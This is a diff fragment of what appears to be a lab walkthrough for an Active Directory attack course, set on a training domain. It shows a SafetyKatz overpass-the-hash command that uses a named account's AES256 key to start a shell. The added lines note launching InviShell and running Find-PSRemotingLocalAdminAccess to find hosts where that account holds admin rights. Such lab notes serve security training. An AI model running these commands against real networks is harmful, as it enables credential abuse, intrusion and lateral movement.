@@ -614,4 +614,12 @@ We can try with the user already found gain a session on this server
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"
 ```
-One we are 
+One we are logged in we can launch invishell.
+Import the Find-PSRemotingLocalAdminAccess.ps1 module to see where the server can log in
+
+```powerview
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+```
+```powerview
+Find-PSRemotingLocalAdminAccess
+```
